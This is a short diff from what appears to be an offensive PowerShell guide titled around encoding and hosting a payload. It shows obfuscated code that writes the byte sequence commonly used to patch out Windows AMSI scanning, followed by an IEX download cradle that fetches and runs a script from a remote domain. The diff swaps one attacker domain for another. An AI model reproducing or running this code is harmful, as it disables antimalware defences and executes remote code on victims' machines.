@@ -139,11 +139,7 @@ Encode and host
 `${_/\__/=\/\___/==\} =` `[Byte[]]` `(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)`
 
 `[System.Runtime.InteropServices.Marshal]``::Copy(${_/\__/=\/\___/==\}, 0, ${___/====\__/=====}, 6)`
-#
-#
-#
-#### CHANGE THIS
-IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))
+IEX ((new-object net.webclient).downloadstring("http://bforgbdaurgjettxago.com/a"))
 ```
 Encode previous txt
 ```
